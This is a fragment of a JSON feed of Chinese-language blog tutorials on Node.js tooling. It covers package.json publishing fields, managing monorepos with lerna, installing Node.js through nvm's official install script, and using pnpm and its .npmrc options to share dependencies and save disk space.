<span>\"!mips\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><code>cpu</code> 架构用 <code>process.arch</code> 探测。</p>\n<h3 id=\"preferglobal\" tabindex=\"-1\"> preferGlobal</h3>\n<p>如果包主要是需要全局安装的命令行程序, 就设置它为 <code>true</code> 来提供一个 <code>warning</code> 给只在局部安装的人。<br> 它不会真正的防止用户在局部安装, 但如果它没有按预期工作它会帮助防止产生误会。</p>\n<h3 id=\"private\" tabindex=\"-1\"> private</h3>\n<p>如果你设置 <code>&quot;private&quot;: true</code> , <code>npm</code> 就不会发布它。<br> 这是一个防止意外发布私有库的方式。如果你要确定给定的包是只发布在特定 <code>registry</code> （如内部 <code>registry</code> ）的, 用 <code>publishConfighash</code> 的描述来重写 <code>registry</code> 的 <code>publish-time</code> 配置参数。</p>\n<h3 id=\"publishconfig\" tabindex=\"-1\"> publishConfig</h3>\n<div><p>作用</p>\n<p>这是一个在 <code>publish-time</code> 使用的配置集合。当你想设置 <code>tag</code> 或者 <code>registry</code> 的时候它非常有用, 所以你可以确定一个给定的包没有打上 <code>&quot;lastest&quot;</code> 的 <code>tag</code> 或者被默认发布到全局的公开 <code>registry</code> 。</p>\n</div>\n<p>任何配置都可以被重写, 但当然可能只有 <code>&quot;tag&quot;</code> 和 <code>&quot;registry&quot;</code> 与发布的意图有关。</p>\n<p>参见 <a href=\"http://npmjs.org/doc/misc/npm-config.html\" target=\"_blank\" rel=\"noopener noreferrer\">npm-config</a> 有可以被重写的列表。</p>\n<h3 id=\"see-also\" tabindex=\"-1\"> SEE ALSO</h3>\n<ul>\n<li>semver</li>\n<li>npm-init</li>\n<li>npm-version</li>\n<li>npm-config</li>\n<li>npm-config</li>\n<li>npm-help</li>\n<li>npm-faq</li>\n<li>npm-install</li>\n<li>npm-publish</li>\n<li>npm-rm</li>\n</ul>\n",
      "date_published": "2016-08-30T17:08:18.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "lerna 的使用指南",
      "url": "https://vxhly.github.io/views/nodejs/usage-lerna.html",
      "id": "https://vxhly.github.io/views/nodejs/usage-lerna.html",
      "summary": "前言\n从 GitHub 上找到了比较多的仓库开始采用 lerna 来管理仓库的多包依赖, 也逐渐发现 lerna 的管理模式确实比较好, so 现贴上我的填坑笔记。\n\n",
      "content_html": "<div><p>前言</p>\n<p>从 GitHub 上找到了比较多的仓库开始采用 lerna 来管理仓库的多包依赖, 也逐渐发现 lerna 的管理模式确实比较好, so 现贴上我的填坑笔记。</p>\n</div>\n\n<h2 id=\"参考资料\" tabindex=\"-1\"> 参考资料</h2>\n<p>先贴上我的参考资料来源</p>\n<ol>\n<li>lerna 官网: <a href=\"https://lerna.js.org/\" target=\"_blank\" rel=\"noopener noreferrer\">lerna.js.org/</a></li>\n<li>lerna 仓库：<a href=\"https://github.com/lerna/lerna/\" target=\"_blank\" rel=\"noopener noreferrer\">github.com/lerna/lerna/</a></li>\n</ol>\n<p>当然也得感谢前人栽的树</p>\n<ol>\n<li><a href=\"https://www.jianshu.com/p/8b7e6025354b\" target=\"_blank\" rel=\"noopener noreferrer\">lerna 的基础使用</a></li>\n<li><a href=\"https://www.jianshu.com/p/63ec67445b0f\" target=\"_blank\" rel=\"noopener noreferrer\">lerna 入门篇</a></li>\n</ol>\n<h2 id=\"什么是-lernajs\" tabindex=\"-1\"> 什么是 lernaJs</h2>\n<p>lernaJs 是由 Babel 团队出的一个多包管理工具, 是 GitHub 上面开源的一款 js 代码库管理软件, 用来对一系列相互耦合比较大、又相互独立的 js git 库进行管理。因为 Babel 包含很多子包, 以前都是放在多个仓库里的, 管理比较困难, 特别是有调用系统内包的时候, 发布比较麻烦。所以为了能更好更快的跨包管理, babel 推出了 lernaJs, 使用了 monorepo 的概念, 现在 React, Babel, Angular, Jest 都在使用这个工具来管理包。</p>\n<p>对于一些功能比较全的库, 我们往往会把各个小功能拆分成独立的 npm 库, 他们直接有比较强的依赖关系。可以解决各个库之间修改混乱、难以跟踪的问题。lerna 可以优化这种情形下的工作流。</p>\n<p>简单的说, lernaJs 是用于管理具有多个包的 JavaScript 的项目工具。(官网原话为：<code>Lerna is a tool that optimizes the workflow around managing multi-package repositories with git and npm.</code>)</p>\n<p>引入 lerna 后, 我们可以解决以下这些问题</p>\n<ol>\n<li>自动解决 packages 之间的依赖关系</li>\n<li>通过 <code>git</code> 检测文件改动, 自动发布</li>\n<li>根据 <code>git</code> 提交记录, 自动生成 <code>CHANGELOG</code></li>\n</ol>\n<h3 id=\"代码库结构\" tabindex=\"-1\"> 代码库结构</h3>\n<p>lerna 管理的库文件结构类似如下这样</p>\n<div><pre><code>my-lerna-repo\n  |\n  |- packages\n  |    |\n  |    |- package-1\n  |    |    |\n  |    |    └─ package.json\n  |    |\n  |    └─ package-2\n  |         |\n  |         └─ package.json\n  |\n  |- package.json\n  |\n  └─ lerna.json\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"lerna-主要做了什么\" tabindex=\"-1\"> lerna 主要做了什么</h3>\n<ol>\n<li>通过 lerna 的命令 <code>lerna bootstrap</code> 将会把代码库进行 link。</li>\n<li>通过 <code>lerna publish</code> 发布最新改动的库</li>\n</ol>\n<h2 id=\"lerna-如何工作的\" tabindex=\"-1\"> lerna 如何工作的</h2>\n<p>默认 lerna 有两种管理模式, 固定模式和独立模式</p>\n<h3 id=\"固定模式\" tabindex=\"-1\"> 固定模式</h3>\n<p>固定模式, 通过 lerna.json 的版本进行版本管理。当你执行 <code>lerna publish</code> 命令时, 如果距离上次发布只修改了一个模块, 将会更新对应模块的版本到新的版本号, 然后你可以只发布修改的库。</p>\n<p>这种模式也是 Babel 使用的方式。如果你希望所有的版本一起变更, 可以更新 minor 版本号, 这样会导致所有的模块都更新版本。</p>\n<h3 id=\"独立模式\" tabindex=\"-1\"> 独立模式</h3>\n<p>独立模式, init 的时候需要设置选项 <code>--independent</code> 。独立模式允许管理者对每个库单独改变版本号, 每次发布的时候, 你需要为每个改动的库指定版本号。这种情况下, <code>lerna.json</code> 的版本号不会变化了, 默认为 <code>independent</code> 。</p>\n<h2 id=\"lerna-json-解析\" tabindex=\"-1\"> lerna.json 解析</h2>\n<div><pre><code><span>{</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.1.3\"</span><span>,</span>\n  <span>\"npmClient\"</span><span>:</span> <span>\"npm\"</span><span>,</span>\n  <span>\"command\"</span><span>:</span> <span>{</span>\n    <span>\"publish\"</span><span>:</span> <span>{</span>\n      <span>\"ignoreChanges\"</span><span>:</span> <span>[</span><span>\"ignored-file\"</span><span>,</span> <span>\"*.md\"</span><span>]</span>\n    <span>}</span><span>,</span>\n    <span>\"bootstrap\"</span><span>:</span> <span>{</span>\n      <span>\"ignore\"</span><span>:</span> <span>\"component-*\"</span><span>,</span>\n      <span>\"npmClientArgs\"</span><span>:</span> <span>[</span><span>\"--no-package-lock\"</span><span>]</span>\n    <span>}</span>\n  <span>}</span><span>,</span>\n  <span>\"packages\"</span><span>:</span> <span>[</span><span>\"packages/*\"</span><span>]</span><span>,</span>\n  <span>\"useWorkspaces\"</span><span>:</span> <span>false</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>\n<li><code>version</code> , 当前库的版本</li>\n<li><code>npmClient</code> , 允许指定命令使用的 client, 默认是 npm, 可以设置成 yarn</li>\n<li><code>command.publish.ignoreChanges</code> , 可以指定那些目录或者文件的变更不会被 publish</li>\n<li><code>command.bootstrap.ignore</code> , 指定不受 bootstrap 命令影响的包</li>\n<li><code>command.bootstrap.npmClientArgs</code> , 指定默认传给 <code>lerna bootstrap</code> 命令的参数</li>\n<li><code>command.bootstrap.scope</code> , 指定那些包会受 <code>lerna bootstrap</code> 命令影响</li>\n<li><code>packages</code> , 指定包所在的目录</li>\n<li><code>useWorkspaces</code> , 支持使用 yarn workspaces</li>\n</ul>\n<h2 id=\"相关命令\" tabindex=\"-1\"> 相关命令</h2>\n<h3 id=\"安装和初始化-lerna-项目\" tabindex=\"-1\"> 安装和初始化 lerna 项目</h3>\n<p>安装 lernajs</p>\n<div><pre><code><span>npm</span> <span>install</span> lerna -g\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>初始化 lernaJs 项目</p>\n<div><pre><code>lerna init\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>复制代码执行后, 会自动生成一个由 lerna 管理的 monorepo。</p>\n<p>其文件结构如下：</p>\n<div><pre><code>lerna-repo/\n  packages/          // 子包都放在这个目录中\n  package.json\n  lerna.json         // lerna js的配置文件\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"添加子包\" tabindex=\"-1\"> 添加子包</h3>\n<p>环境初始好以后, 首先需要添加一个子包, 添加子包的命令如下</p>\n<div><pre><code>lerna create <span>&lt;</span>pkgName<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>执行这个命令后, 会问一些包名啊, 版本等问题和执行 npm init 后问的差不多, 填完这些问题后包就会自动创建一个子包。子包默认的目录结构如下</p>\n<h3 id=\"为子包单独安装依赖\" tabindex=\"-1\"> 为子包单独安装依赖</h3>\n<div><pre><code>lerna <span>add</span> <span>&lt;</span>packageName<span><span>2</span>></span> --scope <span>&lt;</span>packageName<span><span>1</span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>如果你的仓库里的子包需要互相依赖也可用以上命令来安装</p>\n<p>例如：子包 1 为 '@demo/packageName1', 子包 2 为 '@demo/packageName2', 要为子包 1 安装子包 2 的依赖, 你可以这样做, 注意要在项目的根目录执行以下命令</p>\n<div><pre><code>lerna <span>add</span> @demo/packageName2 --scope @demo/packageName1\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"为仓库安装依赖\" tabindex=\"-1\"> 为仓库安装依赖</h3>\n<div><pre><code>lerna bootstrap\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>以上命令可以为仓库安装所有子包的依赖</p>\n<h3 id=\"发布和更新-package\" tabindex=\"-1\"> 发布和更新 package</h3>\n<div><pre><code>lerna publish\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>发布当前项目他创建一个新的 release, 生成新的版本, 执行 <code>git commit/tag</code> 并发布到 npm</p>\n<p>发布项目里的每个模块执行 <code>lerna updated</code> 确定是否需要发布假如需要发布 给 lerna.json 版本号做自增更新 package.json 里的版本号至最新为新版本更新 dependencies 为新版本创建一个 git commit 和 tag 发布更新项目到 npm 一次发布所有 packages, 删除 <code>lerna-temp</code> <code>tags</code> 和增加 tags 到 latest 通过在 package.json 中标记 <code>&quot;private&quot;: true</code> , 将使该包不发布</p>\n<div><p>注意</p>\n<p>以@开头包的发布问题</p>\n</div>\n<p>发布 package 的名字如果是以@开头的, 例如 @feu/tools, npm 默认以为是私人发布, 需要使用 <code>npm publish --access public</code> 发布。但是 <code>lerna publish</code> 不支持该参数, 解决方法参考: <a href=\"https://github.com/lerna/lerna/issues/914\" target=\"_blank\" rel=\"noopener noreferrer\">issues</a></p>\n<p>方案参考:</p>\n<div><pre><code><span>// package.json</span>\n<span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"@feu/tools\"</span><span>,</span>\n  <span>\"publishConfig\"</span><span>:</span> <span>{</span>\n    <span>\"access\"</span><span>:</span> <span>\"public\"</span> <span>// 如果该模块需要发布, 对于scope模块, 需要设置为publish, 否则需要权限验证</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"options\" tabindex=\"-1\"> options</h4>\n<h5 id=\"canary\" tabindex=\"-1\"> canary</h5>\n<div><p>提示</p>\n<p>可以用来独立发布每个 commit, 不打 tag</p>\n</div>\n<div><pre><code>lerna publish --canary\n<span># 1.0.0 => 1.0.1-alpha.0+${SHA} of packages changed since the previous commit</span>\n<span># a subsequent canary publish will yield 1.0.1-alpha.1+${SHA}, etc</span>\n\nlerna publish --canary --preid beta\n<span># 1.0.0 => 1.0.1-beta.0+${SHA}</span>\n\n<span># The following are equivalent:</span>\nlerna publish --canary minor\nlerna publish --canary preminor\n<span># 1.0.0 => 1.1.0-alpha.0+${SHA}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"删除子包中的依赖项\" tabindex=\"-1\"> 删除子包中的依赖项</h3>\n<div><pre><code>lerna clean\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>从所有软件包中删除 <code>node_modules</code> 目录。 <code>lerna clean</code> 尊重 <code>--ignore</code> 和 <code>--scope</code> 标志（请参阅标志）。</p>\n",
      "date_published": "2020-10-25T14:49:11.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "使用 nvm 安装 Node.js",
      "url": "https://vxhly.github.io/views/nodejs/usage-nvm-to-install-node-js.html",
      "id": "https://vxhly.github.io/views/nodejs/usage-nvm-to-install-node-js.html",
      "summary": "前言\n安装 Node.js 的最佳方式是使用 nvm。nvm 最开始是在 Mac OS 下开发的, 所以 Mac OS 下同样使用 nvm 安装 Node.js。\n\n",
      "content_html": "<div><p>前言</p>\n<p>安装 Node.js 的最佳方式是使用 nvm。nvm 最开始是在 <code>Mac OS</code> 下开发的, 所以 <code>Mac OS</code> 下同样使用 nvm 安装 Node.js。</p>\n</div>\n\n<h2 id=\"下载-nvm\" tabindex=\"-1\"> 下载 nvm</h2>\n<h3 id=\"通过-curl-下载-需要安装-curl\" tabindex=\"-1\"> 通过 curl 下载（需要安装 curl）</h3>\n<div><pre><code><span>apt-get</span> <span>install</span> <span>curl</span>\n<span>curl</span> -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh <span>|</span> <span>bash</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"通过-wget-下载-liunx-下载命令\" tabindex=\"-1\"> 通过 wget 下载（liunx 下载命令）</h3>\n<div><pre><code><span>wget</span> -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh <span>|</span> <span>bash</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"重启终端-安装-node-js\" tabindex=\"-1\"> 重启终端, 安装 Node.js</h2>\n<div><pre><code>nvm <span>install</span> <span>&lt;</span>version<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"设定-node-js-的默认版本\" tabindex=\"-1\"> 设定 Node.js 的默认版本</h3>\n<div><pre><code>nvm <span>alias</span> defaults <span>&lt;</span>version<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"查看-node-js-和-npm-版本号\" tabindex=\"-1\"> 查看 Node.js 和 npm 版本号</h3>\n<div><pre><code><span>node</span> -v\n<span>npm</span> -v\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"npm-淘宝换源\" tabindex=\"-1\"> npm 淘宝换源</h2>\n<div><p>提示</p>\n<p>npm 加载的模块, 多数是国外源的, 所以很容易被墙, 解决办法, 除了翻墙, 还有就是 npm 换源, 使用国内源, 但是本人还是推介使用国外源, 因为国外源较国内源稳定、全面。</p>\n</div>\n<div><pre><code><span>npm</span> <span>install</span> -g cnpm --registry<span>=</span>//registry.npm.taobao.org\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 cnpm 安装模块</p>\n<div><pre><code>cnpm <span>install</span> <span>[</span>name<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2016-07-31T15:11:44.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "使用 pnpm 释放你的磁盘空间",
      "url": "https://vxhly.github.io/views/nodejs/usage-pnpm.html",
      "id": "https://vxhly.github.io/views/nodejs/usage-pnpm.html",
      "summary": "前言\n主要介绍 pnpm 的使用, 以及如何使用 pnpm 解决 node 依赖包庞大的问题。pnpm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。\n\n",
      "content_html": "<div><p>前言</p>\n<p>主要介绍 pnpm 的使用, 以及如何使用 pnpm 解决 node 依赖包庞大的问题。pnpm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。</p>\n</div>\n\n<h2 id=\"pnpm-是什么\" tabindex=\"-1\"> pnpm 是什么</h2>\n<p>先上官方的文档 <a href=\"https://pnpm.js.org/en/\" target=\"_blank\" rel=\"noopener noreferrer\">pnpm 的官方文档</a></p>\n<div><p>简介</p>\n<p>官方文档中有这么一句：</p>\n<p>pnpm uses a content-addressable filesystem to store all files from all module directories on a disk.</p>\n<p>中文翻译过来的大概意思是：</p>\n<p>pnpm 使用内容可寻址文件系统将磁盘上所有模块目录中的所有文件存储在磁盘上。</p>\n</div>\n<p>简单的说</p>\n<p>pnpm 是一个更为高效的 node.js 的包管理器, 类似于 npm 和 yarn。pnpm 结合了 npm 和 yarn 的优点, 它会在本地进行缓存依赖项, 加快了下载速度</p>\n<p>pnpm 的原理是会为当前项目下的依赖项在当前磁盘下创建一份 store, 这个 store 存放的信息为依赖项的版本号信息, 用于 pnpm 二次下载时进行陈旧版本检测使用的</p>\n<p>pnpm 还会为当前项目的 node_modules 下创建一个 .pnpm 的一个依赖项存储位置, 在其他依赖项中如果引用了相同的依赖项它会采用硬链接的形式链接到这个位置</p>\n<p>这里寻找到 pnpm 的缺点是：</p>\n<ul>\n<li>pnpm 在每次 install 的时候, 都会去检测陈旧依赖项的版本号信息, 如果项目的依赖项版本号并未进行更新的话, 这一过程无非是比较耗时的</li>\n<li>不得与 npm 和 yarn 进行混用, 例如使用了 pnpm 安装了一个依赖项, 在使用 npm 或 yarn 进行安装依赖项时并不会将依赖项安装到指定的目录下, 这就违背了 pnpm 的设计初衷</li>\n<li>虽然不得与 npm 和 yarn 进行混用, 但是仍然可以使用 npm 或者 yarn 执行项目配置的命令, 这个并不会受到影响</li>\n</ul>\n<p>以上的这些缺点, 我们可以通过对 pnpm 的简单的配置规避掉上方的问题</p>\n<h2 id=\"npm-与-yarn-与-pnpm-的比较\" tabindex=\"-1\"> npm 与 yarn 与 pnpm 的比较</h2>\n<h3 id=\"npm\" tabindex=\"-1\"> npm</h3>\n<p>1）同步下载：安装多个包时会使用从事件队列中读取事件的同步下载模式进行安装依赖；</p>\n<p>2）本地缓存：npm 会在安装依赖后产生本地缓存, 加快再次重新安装时的下载速度；</p>\n<p>3）层级关系复杂：npm 在安装多个依赖包时, 会先遍历各个依赖包, 生成这些包关系树, 这也是 npm 安装时时间慢的一大主要原因；</p>\n<p>4）不稳定, 抛出错误不明显：当某个安装包版本变更后, 在终端编译时会造成抛出错误, 这也是有时候同一份代码你能用别人用不了的原因, 更致命的是, 安装依赖出错时, 抛出错误后并不会停止执行后面的事件, 因此, 如果后面的安装包依赖于出错的安装包, 会报出一堆错误, 你甚至无法得知究竟是哪个包出了问题, 因此大部分时间都是整个删除整个重装 node_modules;</p>\n<ol start=\"5\">\n<li>在 npm5 中, 官方解决了因为版本不一致造成崩溃的问题, 但是需要用户手动执行 npm shrinkwrap 命令, 从而生成一个 package-lock.json 文件, 该文件包含了包的具体信息和版本等内容, 在安装时会首先进行检测, 安装对应版本。</li>\n</ol>\n<p>6）在线安装：需要用到互联网</p>\n<h3 id=\"yarn\" tabindex=\"-1\"> yarn</h3>\n<ol>\n<li>异步下载：多个安装包同时下载, 解决下载慢的问题；</li>\n</ol>\n<p>2）本地缓存：同 npm 一样, 会进行本地缓存, 再次下载先从本地获取</p>\n<p>3）简化命令：对比 npm, 命令更加简短, 语义更加明确</p>\n<p>4）包依赖关系扁平化：npm 会按依赖层级来读取底层包名称, 当层级够深时, windows 下会造成调用数量超限的报错, 而 yarn 则直接取到底层包名称。</p>\n<p>5）指定版本安装, 更加稳定：npm 的稳定性一直是一个问题, yarn 解决了这个问题：在使用 yarn 安装时, 会自动生成一个叫做 yarn.lock 的文件, 该文件包含了当前依赖包的版本信息和对应的校验规则, 在安装新的包之后, 会自动更新, 解决了版本库不对应造成的编译错误。</p>\n<p>6）提供离线模式：即使没有互联网依旧可以使用</p>\n<h3 id=\"pnpm\" tabindex=\"-1\"> pnpm</h3>\n<ol>\n<li>运行速度超过 npm 和 yarn</li>\n</ol>\n<p>2）采用硬链接和符号链接避免复制本地缓存源文件, 解决了 yarn 的一大弱点</p>\n<ol start=\"3\">\n<li>\n<p>提供离线模式：即使没有互联网依旧可以使用</p>\n</li>\n<li>\n<p>异步下载：多个安装包同时下载, 解决下载慢的问题；</p>\n</li>\n</ol>\n<h2 id=\"pnpm-的简单使用\" tabindex=\"-1\"> pnpm 的简单使用</h2>\n<p>首先我们先全局安装 pnpm</p>\n<div><pre><code><span>npm</span> i -g <span>pnpm</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>pnpm 的一些命令与 npm 的都大同小异, 下方例举几个常用的命令, 具体的不做过多的阐述</p>\n<h3 id=\"install\" tabindex=\"-1\"> install</h3>\n<p>安装项目的依赖项</p>\n<div><pre><code>$ <span>pnpm</span> <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"update\" tabindex=\"-1\"> update</h3>\n<p>更新项目的依赖项</p>\n<div><pre><code>$ <span>pnpm</span> update\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"add\" tabindex=\"-1\"> add</h3>\n<p>安装项目的某一个依赖项</p>\n<div><pre><code>$ <span>pnpm</span> <span>add</span> lodash\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"store\" tabindex=\"-1\"> store</h3>\n<p>向本地的存储中安装一个依赖包</p>\n<div><pre><code>$ <span>pnpm</span> store <span>add</span> lodash\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"npmrc-文件解析\" tabindex=\"-1\"> .npmrc 文件解析</h2>\n<p>使用过 node 的同学都知道, npm 会在全局创建一个 .npmrc 文件, 这个文件通常用于存放 npm 的相关配置信息, 例如 npm 的下载软件源</p>\n<div><pre><code>registry=https://registry.npm.taobao.org/\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>在 pnpm 中提供了几个配置项, 而这几个配置项正是 node 工程下实现多个项目共用 node_modules 的核心重点（pnpm 的 .npmrc 的具体官方说明：pnpm 中.npmrc 的配置项）下面例举可能会使用到的配置项</p>\n<h3 id=\"virtual-store-dir\" tabindex=\"-1\"> virtual-store-dir</h3>\n<p>这个配置项的作用是用于存放工程依赖项的实际链接位置, 也是依赖包的缓存目录, 默认值为 node_modules/.pnpm, 即为当前工程下的 node_modules/.pnpm</p>\n<p>上原文的解释</p>\n<div><p>原文</p>\n<p>Added in: v4.1.0</p>\n<ul>\n<li>Default: <em>node_modules/.pnpm</em></li>\n<li>Types: <em>path</em></li>\n</ul>\n<p>The directory with links to the store. All direct and indirect dependencies of the project are linked into this directory.</p>\n<p>This is a useful setting that can solve issues with long paths on Windows. If you have some dependencies with very long paths, you can select a virtual store in the root of your drive (for instance <code>C:\\my-project-store</code> ).</p>\n<p>Or you can set the virtual store to <code>.pnpm</code> and add it to <code>.gitignore</code> . This will make the stacktraces nicer as paths to dependencies will have one directory less.</p>\n<p><em>NOTE</em>: the virtual store cannot be shared between several projects. Every project should have its own virtual store.</p>\n</div>\n<h3 id=\"store-dir\" tabindex=\"-1\"> store-dir</h3>\n<p>这个配置项的作用是存放所有依赖项的的所有版本号信息, 用于 pnpm 进行陈旧性检测, 默认值为 ~/.pnpm-store（在 linux 下指向的是用户目录 ~, 在 Windows 下指向的是当前的磁盘根目录）</p>\n<p>上原文的解释</p>\n<div><p>原文</p>\n<p>Added in: v4.2.0 (renamed from store)</p>\n<ul>\n<li>Default: <em>~/.pnpm-store</em></li>\n<li>Type: <em>path</em></li>\n</ul>\n<p>The location where all the packages are saved on the disk.</p>\n<p>The store should be always on the same disk on which installation is happening. So there will be one store per disk. If there is a home directory on the current disk, then the store is created in <code>&lt;home dir&gt;/.pnpm-store</code> . If there is no homedir on the disk, then the store is created in the root. For example, if installation is happening on disk D then the store will be created in <code>D:\\.pnpm-store</code> .</p>\n<p>It is possible to set a store from a different disk but in that case pnpm will copy, not link, packages from the store. Hard links are possible only inside a filesystem.</p>\n</div>\n<h3 id=\"package-import-method\" tabindex=\"-1\"> package-import-method</h3>\n<p>这个配置项的作用是用于指定依赖包导入的方式, 默认值为 auto, 会自动判断是否需要从网上的源进行下载操作</p>\n<p>上原文的解释</p>\n<div><p>原文</p>\n<p>Added in: v1.25.0</p>\n<ul>\n<li>Default: <em>auto</em></li>\n<li>Type: <em>auto</em>, <em>hardlink</em>, <em>copy</em>, <em>clone</em></li>\n</ul>\n<p>Controls the way packages are imported from the store.</p>\n<p><em>auto</em> - try to clone packages from the store. If cloning is not supported then hardlink packages from the store. If neither cloning nor linking is possible, falls back to copying <em>hardlink</em> - hardlink packages from the store <em>copy</em> - copy packages from the store <em>clone</em> - clone (aka copy-on-write or reflink) packages from the store</p>\n</div>\n<h3 id=\"shamefully-hoist\" tabindex=\"-1\"> shamefully-hoist</h3>\n<p>这个配置项允许我们在安装依赖项时, 默认值为 false, node_modules 目录像 npm 的一样, 因为 pnpm 默认生成的 node_modules 是属于半严格的树形结构</p>\n<p>上原文的解释</p>\n<div><p>原文</p>\n<p>Added in: v1.34.0 (Renamed from <code>shamefully-flatten</code> in v4.0.0)</p>\n<ul>\n<li>Default: <em>false</em></li>\n<li>Type: <em>Boolean</em></li>\n</ul>\n<p>By default, pnpm creates a semistrict <code>node_modules</code> . It means that your dependencies have access to undeclared dependencies but your code does not. With this layout, most of the packages in the ecosystem work with no issues. However, if some tooling only works when the hoisted dependencies are in the root of <code>node_modules</code> , you can set this config to <code>true</code> .</p>\n</div>\n<h3 id=\"link-workspace-packages\" tabindex=\"-1\"> link-workspace-packages</h3>\n<p>这个配置项允许我们在安装依赖项的时候, 将所有的子项目依赖项安装到项目的根目录下, 默认值为 true</p>\n<p>上原文的解释</p>\n<div><p>原文</p>\n<p>Added in: v2.14.0</p>\n<ul>\n<li>Default: <em>true</em></li>\n<li>Type: <em>true</em>, <em>false</em>, <em>deep</em></li>\n</ul>\n<p>When <code>true</code> , locally available packages are linked to <code>node_modules</code> instead of being downloaded from the registry. This is very convenient in a monorepo. If you need local packages also be linked to subdependencies, you can use the <code>deep</code> setting (since v5).</p>\n<p>When <code>false</code> , packages are downloaded and installed from the registry. However, workspace packages can still be linked by using the <code>workspace:</code> range protocol. e.g. <code>pnpm add batman@workspace:*</code> <em>Usage</em></p>\n<p>Create a <code>.npmrc</code> file in the root of your monorepo with the following content:</p>\n<div><pre><code>link-workspace-packages = true\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>Create a <code>pnpm-workspace.yaml</code> file with the following content:</p>\n<div><pre><code>packages:\n  - '**'\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>Run <code>pnpm recursive install</code> .</p>\n</div>\n<h3 id=\"registry\" tabindex=\"-1\"> registry</h3>\n<p>定义了 npm 的下载软件源, 需要注意的是：如果采用私有源的话, 私有源的软件包一定要全, 要和官方源一致（否则在 install 的时候会出现某些依赖项安装失败而出现的问题）</p>\n<p>上原文的解释</p>\n<div><p>原文</p>\n<ul>\n<li>Default: <a href=\"https://registry.npmjs.org/\" target=\"_blank\" rel=\"noopener noreferrer\">https://registry.npmjs.org/</a></li>\n<li>Type: <em>url</em></li>\n</ul>\n<p>The base URL of the npm package registry.</p>\n</div>\n<h2 id=\"为什么要优化-node-modules\" tabindex=\"-1\"> 为什么要优化 node_modules</h2>\n<p>最初的 npm 包管理, 是全局共享的, 类似 java 的 maven 仓库, 但是由于前端的 npm 包是经常修改和重新发布的, 这就涉及到一个包版本问题, 不同的项目有可能依赖不同版本的包, 所以 npm 后续版本把仓库独立到各自工程去了, 这样处理最明显的坏处是：</p>\n<ul>\n<li>每次都需要安装依赖, 费流量, 网速慢时很费时间</li>\n<li>浪费磁盘空间, 每个 node_modules 中包含的工具很多, 动辄 200M</li>\n</ul>\n<p>而好处是：</p>\n<ul>\n<li>使用 package.json 安装好之后, node_modules 文件夹中没有版本信息, 删掉 package.json 也不会有任何影响。</li>\n<li>移动/复制/打包项目比较简单, 对于开发、部署都有好处</li>\n<li>对于设计 npm 的人来说, 这是最省事的包依赖方法。这就好比 maven 安装依赖之后自动将 jar 包安装到项目的 lib 里面。</li>\n<li>随意改代码。安装在 node_modules 里面的东西, 你可以随便改, 无需担心对其它项目的影响。在 Java 中使用 maven 管理项目时, 如果想要定制某个库, 就需要更改这个库的源代码,</li>\n<li>这时就需要把这个库的源代码复制到项目中, 跟 node_modules 是一个道理。npm 的设计者大概认为：前端都是经常修改库的源代码的。</li>\n</ul>\n<h2 id=\"解决思路和方案\" tabindex=\"-1\"> 解决思路和方案</h2>\n<p>我们采用 pnpm 的最终就是为了能够解决多个工程下共用一个 node_modules, 并且能够提升我们的 install 速度, 这里采用到的是 pnpm 中 pnpm workspace 这一特性, 这一特性允许我们将子工程的依赖项全部安装到同一个目录下, 